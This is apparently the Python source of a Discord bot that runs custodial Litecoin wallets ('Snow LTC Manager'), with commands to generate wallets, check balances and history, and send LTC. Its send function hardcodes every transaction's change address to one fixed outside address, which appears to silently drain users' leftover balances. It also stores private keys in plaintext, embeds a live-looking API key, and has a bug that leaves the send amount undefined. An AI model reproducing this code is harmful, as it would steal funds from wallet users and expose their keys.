import discord
from discord.ext import commands
from discord import app_commands
import json
import os
import aiohttp
from datetime import datetime
import requests
from typing import List

# Bot configuration
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
LTC_EXPLORER_URL = "https://blockchair.com/litecoin/transaction"
# Initialize data file
DATA_FILE = 'data.json'
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump({}, f)

# Tatum API configuration
TATUM_API_KEY = "t-65e5b882d452f2001cee2ec0-f6be0bd83d2849df82c00ffa"  # Replace with your actual API key
TATUM_API_URL = "https://api.tatum.io/v3/litecoin"


def usd_to_ltc(amount):
    response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')
    
    if response.status_code == 200:
        price = response.json()['litecoin']['usd']
        ltcval = float(amount)/ float(price)
        ltcvalf = round(ltcval, 7)
        print(ltcvalf)
        return ltcvalf
    else:
        return None

def send_ltc(sendaddy, private_key, recipient_address, amount) :
    url = "https://api.tatum.io/v3/litecoin/transaction"
    gayaf = amount-0.00005
    formatted_amount = round(float(gayaf), 8)
    payload = {
    "fromAddress": [
        {
        "address": sendaddy,
        "privateKey": private_key
        }
    ],
    "to": [
        {
        "address": recipient_address,
        "value": formatted_amount
        }
    ],
    "fee": "0.00005",
    "changeAddress": "LZYVaRBqa44QcdvUTvHTE165ThQx7cGJSA"
    }

    headers = {
    "Content-Type": "application/json",
    "x-api-key": TATUM_API_KEY
    }

    response = requests.post(url, json=payload, headers=headers)
    data = response.json()
    tx = data["txId"]
    return tx

def ltc_to_usd(amount):
    response = requests.get('https://api.binance.com/api/v3/ticker/price?symbol=LTCUSDT')
    data = response.json()
    return round(float(amount) * float(data['price']), 2)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print('------')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands")
    except Exception as e:
        print(f"Error syncing commands: {e}")

@bot.tree.command(name="help", description="Show all available commands and their usage")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def help_command(interaction: discord.Interaction):
    """Show help information about all commands"""
    em = discord.Embed(
        title="LTC Wallet Bot Help",
        description="Here are all the available commands for managing your Litecoin wallet:",
        color=0x975cff
    )
    
    # Command descriptions
    commands_info = [
        ("`/generate_wallet`", "Create a new LTC wallet with address and private key"),
        ("`/get_address`", "View your LTC wallet address"),
        ("`/get_private_key`", "View your wallet's private key (keep this secure!)"),
        ("`/delete_wallet`", "Permanently delete your wallet from the bot"),
        ("`/my_balance`", "Check your wallet's LTC balance and recent transactions"),
        ("`/get_balance <address>`", "Check any LTC address balance"),
        ("`/send_ltc <address> <amount> [usd]`", "Send LTC to another address (supports USD amounts)"),
        ("`/history`", "View your complete transaction history with pagination"),
        ("`/login <private_key>`", "Transfer wallet ownership using your private key"),
        ("`/help`", "Show this help message")
    ]
    
    # Add fields for each command
    for cmd, desc in commands_info:
        em.add_field(name=cmd, value=desc, inline=False)
    
    # Additional notes
    em.add_field(
        name="Important Notes",
        value="â¢ Always keep your private key secure!\n"
              "â¢ Transactions may take a few minutes to confirm\n"
              "â¢ USD values are estimates based on current market price",
        inline=False
    )
    
    em.set_footer(
        text="Snow LTC Manager",
        icon_url="https://cdn.discordapp.com/attachments/1373630302710399039/1379843785277702256/IMG_0955.jpg"
    )
    
    await interaction.response.send_message(embed=em, ephemeral=False)
    
@bot.tree.command(name="generate_wallet", description="Generate a new LTC wallet.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def generate_ltc_wallet(interaction: discord.Interaction):
    try:
        user_id = str(interaction.user.id)

        with open(DATA_FILE, 'r') as f:
            data = json.load(f)

        if user_id in data:
            await interaction.response.send_message(
                "You already have an LTC wallet.",
                ephemeral=True
            )
            return

        async with aiohttp.ClientSession() as session:
            # Generate wallet
            wallet_url = f"{TATUM_API_URL}/wallet"
            async with session.get(wallet_url, headers={"x-api-key": TATUM_API_KEY}) as response:
                if response.status != 200:
                    await interaction.response.send_message(
                        "Failed to create your LTC wallet.",
                        ephemeral=True
                    )
                    return
                wallet = await response.json()

            # Generate private key
            priv_key_url = f"{TATUM_API_URL}/wallet/priv"
            payload = {"mnemonic": wallet["mnemonic"], "index": 0}
            async with session.post(priv_key_url, json=payload, headers={"x-api-key": TATUM_API_KEY}) as priv_response:
                if priv_response.status != 200:
                    await interaction.response.send_message(
                        "Failed to generate private key. Please try again later.",
                        ephemeral=True
                    )
                    return
                priv_key = await priv_response.json()


            # Generate address
            address_url = f"{TATUM_API_URL}/address/{wallet['xpub']}/0"
            async with session.get(address_url, headers={"x-api-key": TATUM_API_KEY}) as address_response:
                if address_response.status != 200:
                    await interaction.response.send_message(
                        "Failed to generate address. Please try again later.",
                        ephemeral=True
                    )
                    return
                fucku = await address_response.json()
                address = fucku['address']

        # Save wallet data
        data[user_id] = {
            "address": address,
            "private_key": priv_key["key"],
            "xpub": wallet["xpub"],
            "generated_at": str(datetime.utcnow())
        }

        with open(DATA_FILE, 'w') as f:
            json.dump(data, f, indent=4)

        em = discord.Embed(title="LTC Wallet Generated", description=f"**LTC address:** `{address}`\n**Private Key:** `{priv_key['key']}`", color=0x975cff)
        em.set_footer(text="Keep your private key secure!", icon_url="https://cdn.discordapp.com/attachments/1373630302710399039/1379843785277702256/IMG_0955.jpg?ex=6841b72a&is=684065aa&hm=7d904f40a049c0aa268707320d8aeb8a50591bc7e045be71b66cb6597167f566&")
        await interaction.response.send_message(embed=em,
            ephemeral=True
        )

    except Exception as e:
        print(f"Error generating LTC wallet: {e}")
        await interaction.response.send_message(
            "An error occurred while generating your wallet. Please try again later.",
            ephemeral=True
        )

@bot.tree.command(name="get_address", description="Get your wallet's LTC address")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def get_address(interaction: discord.Interaction):
    user_id = str(interaction.user.id)

    with open(DATA_FILE, 'r') as f:
        data = json.load(f)

    if user_id not in data:
        await interaction.response.send_message(
            "You don't have an LTC wallet yet. Use `/generate_wallet` to create one.",
            ephemeral=False
        )
        return
    em = discord.Embed(title="LTC Address", description=f"**LTC Address:** `{data[user_id]['address']}`", color=0x975cff)
    em.set_footer(text="Snow LTC Manager", icon_url="https://cdn.discordapp.com/attachments/1373630302710399039/1379843785277702256/IMG_0955.jpg?ex=6841b72a&is=684065aa&hm=7d904f40a049c0aa268707320d8aeb8a50591bc7e045be71b66cb6597167f566&")
    await interaction.response.send_message(embed=em,
        ephemeral=False
    )

# Private key retrieval command
@bot.tree.command(name="get_private_key", description="Get your LTC wallet's private key.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def get_ltc_private_key(interaction: discord.Interaction):
    user_id = str(interaction.user.id)

    with open(DATA_FILE, 'r') as f:
        data = json.load(f)

    if user_id not in data:
        await interaction.response.send_message(
            "You don't have an LTC wallet yet. Use `/generate_wallet` to create one.",
            ephemeral=True
        )
        return

    em = discord.Embed(title="LTC Private Key", description=f"**Private Key:** `{data[user_id]['private_key']}`", color=0x975cff)
    em.set_footer(text="Keep your private key secure!", icon_url="https://cdn.discordapp.com/attachments/1373630302710399039/1379843785277702256/IMG_0955.jpg?ex=6841b72a&is=684065aa&hm=7d904f40a049c0aa268707320d8aeb8a50591bc7e045be71b66cb6597167f566&")
    await interaction.response.send_message(embed=em,
        ephemeral=True
    )

# Wallet deletion command
@bot.tree.command(name="delete_wallet", description="Delete's your LTC wallet without any refunds.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def delete_ltc_wallet(interaction: discord.Interaction):
    user_id = str(interaction.user.id)

    with open(DATA_FILE, 'r') as f:
        data = json.load(f)

    if user_id not in data:
        await interaction.response.send_message(
            "You don't have an LTC wallet to delete.",
            ephemeral=True
        )
        return

    em = discord.Embed(title="LTC Wallet Deleted", description=f"Your LTC wallet has been succesfully deleted.", color=0x975cff)
    em.add_field(name="Address", value=f"`{data[user_id]['address']}`", inline=False)
    em.set_footer(text="Snow LTC Manager", icon_url="https://cdn.discordapp.com/attachments/1373630302710399039/1379843785277702256/IMG_0955.jpg?ex=6841b72a&is=684065aa&hm=7d904f40a049c0aa268707320d8aeb8a50591bc7e045be71b66cb6597167f566&")
    del data[user_id]
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)
    await interaction.response.send_message(embed=em
        ,
        ephemeral=False
    )

@bot.tree.command(name="my_balance", description="Check your LTC address balance.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def my_balance(interaction: discord.Interaction):
    try:
        user_id = str(interaction.user.id)

        with open(DATA_FILE, 'r') as f:
            data = json.load(f)

        address = data[user_id]["address"]

        # Get balance and transactions from BlockCypher
        async with aiohttp.ClientSession() as session:
            # Get address balance and transactions
            url = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}"
            async with session.get(url) as response:
                if response.status != 200:
                    await interaction.response.send_message(
                        "Failed to fetch balance. Please try again later.",
                        ephemeral=True
                    )
                    return

                data = await response.json()
                balance = data['balance'] / 100000000  # Convert from satoshis to LTC
                unconfirmed_balance = data['unconfirmed_balance'] / 100000000
                total_received = data['total_received'] / 100000000

                # Convert to USD
                usd_bal = ltc_to_usd(balance)
                unc_usd = ltc_to_usd(unconfirmed_balance)
                total_usd = ltc_to_usd(total_received)

                # Get last 5 transactions
                tx_url = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}/full?limit=5"
                async with session.get(tx_url) as tx_response:
                    if tx_response.status != 200:
                        transactions = []
                    else:
                        tx_data = await tx_response.json()
                        transactions = tx_data.get('txs', [])[:5]  # Get first 5 transactions

        # Create embed
        em = discord.Embed(
            title="LTC Wallet Balance",
            description=f"Here is the balance information for `{address}`:",
            color=0x975cff
        )
        em.add_field(name="Current Balance", value=f"`{balance:.8f} LTC` / `${usd_bal:.2f}`", inline=False)
        em.add_field(name="Unconfirmed Balance", value=f"`{unconfirmed_balance:.8f} LTC` / `${unc_usd:.2f}`", inline=False)
        em.add_field(name="Total LTC Received", value=f"`{total_received:.8f} LTC` / `${total_usd:.2f}`", inline=False)

        # Add transactions if available
        if transactions:
            tx_list = []
            for tx in transactions:
                try:
                    # Check if this is a coinbase transaction (mining reward)
                    if 'coinbase' in tx.get('inputs', [{}])[0]:
                        direction = "Mining Reward"
                        amount = sum(out['value'] for out in tx.get('outputs', []) 
                                   if address in out.get('addresses', [])) / 100000000
                    else:
                        # Check if any input comes from our address (outgoing)
                        is_outgoing = any(inp.get('addresses', [None])[0] == address 
                                     for inp in tx.get('inputs', []))

                        if is_outgoing:
                            direction = "Outgoing"
                            # Sum all outputs that don't go to our address
                            amount = sum(out['value'] for out in tx.get('outputs', [])
                                      if address not in out.get('addresses', [])) / 100000000
                            # If all outputs go back to our address (self-transfer), show the fee
                            if amount == 0:
                                amount = tx.get('fees', 0) / 100000000
                                direction = "Self-Transfer"
                        else:
                            direction = "Incoming"
                            # Sum all outputs that go to our address
                            amount = sum(out['value'] for out in tx.get('outputs', [])
                                      if address in out.get('addresses', [])) / 100000000

                    # Format date
                    tx_date = tx.get('confirmed', tx.get('received', ''))
                    if tx_date:
                        tx_date = tx_date.split('T')[0]  # Just get the date part

                    tx_list.append(
                        f"â¢ [{direction}] `{amount:.8f} LTC` {tx_date} - [View](https://live.blockcypher.com/ltc/tx/{tx['hash']}/)"
                    )
                except Exception as e:
                    print(f"Error parsing transaction {tx.get('hash', 'unknown')}: {e}")
                    continue

            if tx_list:
                em.add_field(
                    name="Last 5 Transactions",
                    value="\n".join(tx_list),
                    inline=False
                )
            else:
                em.add_field(
                    name="Transactions",
                    value="Could not parse transaction history",
                    inline=False
                )
        else:
            em.add_field(name="Transactions", value="No recent transactions", inline=False)

        em.set_footer(text="Snow LTC Manager", icon_url="https://cdn.discordapp.com/attachments/1373630302710399039/1379843785277702256/IMG_0955.jpg?ex=6841b72a&is=684065aa&hm=7d904f40a049c0aa268707320d8aeb8a50591bc7e045be71b66cb6597167f566&")
        await interaction.response.send_message(embed=em)

    except KeyError:
        await interaction.response.send_message("You don't have an LTC address registered yet.", ephemeral=True)
    except Exception as e:
        print(f"Error getting balance: {e}")
        await interaction.response.send_message("An error occurred while getting your balance.", ephemeral=True)

@bot.tree.command(name="get_balance", description="Check any LTC address balance (same format as /my_balance)")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def get_balance(interaction: discord.Interaction, address: str):
            try:
                # Validate LTC address form

                async with aiohttp.ClientSession() as session:
                    # Get balance data
                    url = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}"
                    async with session.get(url) as response:
                        if response.status != 200:
                            await interaction.response.send_message(
                                "â ï¸ Couldn't fetch balance. The address may not exist or API is down.",
                                ephemeral=True
                            )
                            return
                        data = await response.json()

                    # Get transactions
                    tx_url = f"{url}/full?limit=5"
                    async with session.get(tx_url) as tx_response:
                        transactions = (await tx_response.json()).get('txs', [])[:5] if tx_response.status == 200 else []

                # Convert balances
                balance = data['balance'] / 100000000
                unconfirmed = data['unconfirmed_balance'] / 100000000
                total_received = data['total_received'] / 100000000

                usd_bal = ltc_to_usd(balance)
                usd_unconfirmed = ltc_to_usd(unconfirmed)
                usd_total = ltc_to_usd(total_received)

                # Build identical embed to /my_balance
                em = discord.Embed(
                    title="LTC Wallet Balance",
                    description=f"Here is the balance information for `{address}`:",
                    color=0x975cff
                )
                em.add_field(name="Current Balance", value=f"`{balance:.8f} LTC` / `${usd_bal:.2f}`", inline=False)
                em.add_field(name="Unconfirmed Balance", value=f"`{unconfirmed:.8f} LTC` / `${usd_unconfirmed:.2f}`", inline=False)
                em.add_field(name="Total LTC Received", value=f"`{total_received:.8f} LTC` / `${usd_total:.2f}`", inline=False)

                # Transaction parsing (identical to original)
                if transactions:
                    tx_list = []
                    for tx in transactions:
                        try:
                            if 'coinbase' in tx.get('inputs', [{}])[0]:
                                direction = "Mining Reward"
                                amount = sum(out['value'] for out in tx.get('outputs', []) 
                                           if address in out.get('addresses', [])) / 100000000
                            else:
                                is_outgoing = any(inp.get('addresses', [None])[0] == address 
                                             for inp in tx.get('inputs', []))

                                if is_outgoing:
                                    direction = "Outgoing"
                                    amount = sum(out['value'] for out in tx.get('outputs', [])
                                              if address not in out.get('addresses', [])) / 100000000
                                    if amount == 0:
                                        amount = tx.get('fees', 0) / 100000000
                                        direction = "Self-Transfer"
                                else:
                                    direction = "Incoming"
                                    amount = sum(out['value'] for out in tx.get('outputs', [])
                                              if address in out.get('addresses', [])) / 100000000

                            tx_date = tx.get('confirmed', tx.get('received', ''))[:10]  # YYYY-MM-DD
                            tx_list.append(
                                f"â¢ [{direction}] `{amount:.8f} LTC` {tx_date} - [View](https://live.blockcypher.com/ltc/tx/{tx['hash']}/)"
                            )
                        except Exception:
                            continue

                    em.add_field(
                        name="Last 5 Transactions",
                        value="\n".join(tx_list) if tx_list else "Couldn't parse transactions",
                        inline=False
                    )
                else:
                    em.add_field(name="Transactions", value="No recent transactions", inline=False)

                em.set_footer(text="Snow LTC Manager", icon_url="https://cdn.discordapp.com/attachments/1373630302710399039/1379843785277702256/IMG_0955.jpg")
                await interaction.response.send_message(embed=em)

            except Exception as e:
                print(f"Error in get_balance: {e}")
                await interaction.response.send_message(
                    "â ï¸ An error occurred. Please try again later.",
                    ephemeral=True
                )

@bot.tree.command(name="login", description="Transfer wallet ownership using your private key")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def login(interaction: discord.Interaction, private_key: str):
    try:
        current_user_id = str(interaction.user.id)

        with open(DATA_FILE, 'r') as f:
            data = json.load(f)

        wallet_found = False
        old_user_id = None

        for user_id, wallet in data.items():
            if wallet['private_key'] == private_key:
                wallet_found = True
                old_user_id = user_id
                break

        if not wallet_found:
            await interaction.response.send_message(
                "â No wallet found with this private key.",
                ephemeral=True
            )
            return

        if current_user_id in data:
            em = discord.Embed(
                title="Wallet Transfer Failed",
                description="You already have a wallet. Delete it first with `/delete_wallet`",
                color=0xff0000
            )
            await interaction.response.send_message(embed=em, ephemeral=True)
            return

        data[current_user_id] = data[old_user_id]
        del data[old_user_id]

        with open(DATA_FILE, 'w') as f:
            json.dump(data, f, indent=4)

        em = discord.Embed(
            title="â Login Successful",
            description="Wallet transferred to your account",
            color=0x00ff00
        )
        em.add_field(name="Address", value=f"`{data[current_user_id]['address']}`")
        await interaction.response.send_message(embed=em, ephemeral=True)

    except Exception as e:
        print(f"Login error: {e}")
        await interaction.response.send_message(
            "â Transfer failed. Please try again.",
            ephemeral=True
        )

@bot.tree.command(name="send_ltc", description="Send LTC to another address (supports USD amounts)")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(
    recipient_address="The Litecoin address to send to",
    amount="Amount to send",
    is_usd="Set to True if amount is in USD (default False)"
)
async def send_ltc_command(
    interaction: discord.Interaction,
    recipient_address: str,
    amount: float,
    is_usd: bool = True
):
    try:
        user_id = str(interaction.user.id)

        with open(DATA_FILE, 'r') as f:
            data = json.load(f)

        if user_id not in data:
            await interaction.response.send_message(
                "â You don't have a wallet. Create one with `/generate_wallet` first.",
                ephemeral=True
            )
            return

        wallet = data[user_id]
        send_address = wallet['address']
        private_key = wallet['private_key']

        # Convert USD to LTC if needed
        if is_usd:
            ltc_amount = usd_to_ltc(amount)
            if ltc_amount is None:
                await interaction.response.send_message(
                    "â Failed to get current LTC price. Please try again later.",
                    ephemeral=True
                )
                return
            amount = ltc_amount

        # Check balance
        balance_url = f"{TATUM_API_URL}/address/balance/{send_address}"
        async with aiohttp.ClientSession() as session:
            async with session.get(balance_url, headers={"x-api-key": TATUM_API_KEY}) as response:
                if response.status != 200:
                    await interaction.response.send_message(
                        "â Failed to check your balance",
                        ephemeral=True
                    )
                    return
                balance_data = await response.json()
                available_balance = float(balance_data['incoming']) - float(balance_data['outgoing'])

        # Calculate total cost (amount + 0.00005 LTC fee)
        total_cost = amount

        if available_balance < total_cost:
            usd_balance = ltc_to_usd(available_balance)
            usd_needed = ltc_to_usd(total_cost)

            em = discord.Embed(
                title="â Insufficient Funds",
                color=0xff0000
            )
            em.add_field(name="Your Balance", 
                        value=f"{available_balance:.8f} LTC (${usd_balance:.2f})", 
                        inline=False)
            em.add_field(name="Amount Needed", 
                        value=f"{total_cost:.8f} LTC (${usd_needed:.2f})", 
                        inline=False)
            await interaction.response.send_message(embed=em, ephemeral=True)
            return

        # Send transaction
        tx_id = send_ltc(send_address, private_key, recipient_address, ltc_amount)

        if not tx_id:
            await interaction.response.send_message(
                "â Transaction failed. Please try again later.",
                ephemeral=True
            )
            return

        # Success message
        usd_value = ltc_to_usd(amount)
        em = discord.Embed(
            title="Transaction Successful",
            color=0x975cff
        )
        em.add_field(name="Amount", 
                    value=f"`{amount:.8f} LTC` (`${usd_value:.2f}`)", 
                    inline=False)
        em.add_field(name="Recipient Address", 
                    value=f"`{recipient_address}`", 
                    inline=False)
        em.add_field(name="Network Fee", 
                    value="`0.00005 LTC`", 
                    inline=False)
        em.add_field(name="Transaction ID", 
                    value=f"[View](https://live.blockcypher.com/ltc/tx/{tx_id}/)", 
                    inline=False)
        em.set_footer(text="Transaction may take a few minutes to confirm", icon_url="https://cdn.discordapp.com/attachments/1373630302710399039/1379843785277702256/IMG_0955.jpg?ex=6841b72a&is=684065aa&hm=7d904f40a049c0aa268707320d8aeb8a50591bc7e045be71b66cb6597167f566&")

        await interaction.response.send_message(embed=em)

    except Exception as e:
        print(f"Error in send_ltc command: {e}")
        await interaction.response.send_message(
            "â An error occurred. Please try again later.",
            ephemeral=True
        )



class HistoryPaginator(discord.ui.View):
    def __init__(self, address: str, transactions: List[dict], total_txs: int):
        super().__init__(timeout=120)
        self.address = address
        self.transactions = transactions
        self.total_txs = total_txs
        self.page = 0
        self.page_size = 10
        self.max_page = (len(transactions) // self.page_size) - 1

    async def generate_embed(self) -> discord.Embed:
        start_idx = self.page * self.page_size
        end_idx = start_idx + self.page_size
        page_txs = self.transactions[start_idx:end_idx]

        embed = discord.Embed(
            title=f"Transaction History - {self.address[:6]}...{self.address[-4:]}",
            description=f"Page {self.page + 1}/{(len(self.transactions) // self.page_size) + 1} | Total TXs: {self.total_txs}",
            color=0x975cff
        )

        for tx in page_txs:
            try:
                # Determine transaction type
                if 'coinbase' in tx.get('inputs', [{}])[0]:
                    tx_type = "âï¸ Mining Reward"
                    amount = sum(o['value'] for o in tx['outputs'] 
                               if self.address in o.get('addresses', [])) / 1e8
                else:
                    is_outgoing = any(inp.get('addresses', [None])[0] == self.address 
                                   for inp in tx.get('inputs', []))

                    if is_outgoing:
                        tx_type = "[Outgoing]"
                        amount = sum(o['value'] for o in tx['outputs'] 
                                   if self.address not in o.get('addresses', [])) / 1e8
                        if amount == 0:
                            amount = tx.get('fees', 0) / 1e8
                            tx_type = "ð Self Transfer"
                    else:
                        tx_type = "[Incoming]"
                        amount = sum(o['value'] for o in tx['outputs'] 
                                   if self.address in o.get('addresses', [])) / 1e8

                # Format date
                date = tx.get('confirmed', tx.get('received', ''))[:10]

                embed.add_field(
                    name=f"{tx_type} - {date}",
                    value=f"`{amount:.8f} LTC` - [View TX]({LTC_EXPLORER_URL}/{tx['hash']})",
                    inline=False
                )
            except Exception as e:
                print(f"Error processing TX {tx.get('hash')}: {e}")
                continue

        embed.set_footer(
            text="Snow LTC Manager",
            icon_url="https://cdn.discordapp.com/attachments/1373630302710399039/1379843785277702256/IMG_0955.jpg"
        )
        return embed

    @discord.ui.button(emoji="â¬ï¸", style=discord.ButtonStyle.grey, disabled=True)
    async def prev_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.page = max(0, self.page - 1)
        self.next_button.disabled = False
        self.prev_button.disabled = (self.page == 0)
        embed = await self.generate_embed()
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(emoji="â¡ï¸", style=discord.ButtonStyle.grey)
    async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.page += 1
        self.prev_button.disabled = False
        self.next_button.disabled = (self.page >= self.max_page)
        embed = await self.generate_embed()
        await interaction.response.edit_message(embed=embed, view=self)

@bot.tree.command(name="history", description="View your complete LTC transaction history")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def history(interaction: discord.Interaction):
    """Shows paginated transaction history for the user's registered LTC address"""
    try:
        user_id = str(interaction.user.id)

        # Load user data
        try:
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
            address = data[user_id]["address"]
        except (FileNotFoundError, KeyError):
            return await interaction.response.send_message(
                "â You don't have an LTC address registered yet!",
                ephemeral=True
            )

        # Fetch transaction data
        async with aiohttp.ClientSession() as session:
            # Get total transaction count
            count_url = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}"
            async with session.get(count_url) as response:
                if response.status != 200:
                    return await interaction.response.send_message(
                        "â ï¸ Failed to fetch transaction count",
                        ephemeral=True
                    )
                total_txs = (await response.json()).get('n_tx', 0)

            # Get initial batch of transactions
            tx_url = f"{count_url}/full?limit=50"  # First 50 transactions
            async with session.get(tx_url) as tx_response:
                if tx_response.status != 200:
                    return await interaction.response.send_message(
                        "â ï¸ Failed to load transactions",
                        ephemeral=True
                    )
                transactions = (await tx_response.json()).get('txs', [])

        if not transactions:
            return await interaction.response.send_message(
                "ð No transactions found for your address",
                ephemeral=True
            )

        # Create and send paginated view
        view = HistoryPaginator(address, transactions, total_txs)
        embed = await view.generate_embed()

        # Disable next button if we don't have enough transactions
        view.next_button.disabled = (len(transactions) <= view.page_size)

        await interaction.response.send_message(embed=embed, view=view)

    except Exception as e:
        print(f"Error in /history command: {e}")
        await interaction.response.send_message(
            "â ï¸ An unexpected error occurred. Please try again later.",
            ephemeral=True
        )


# Run the bot
if __name__ == "__main__":
    bot.run("token")  # Replace with your bot token
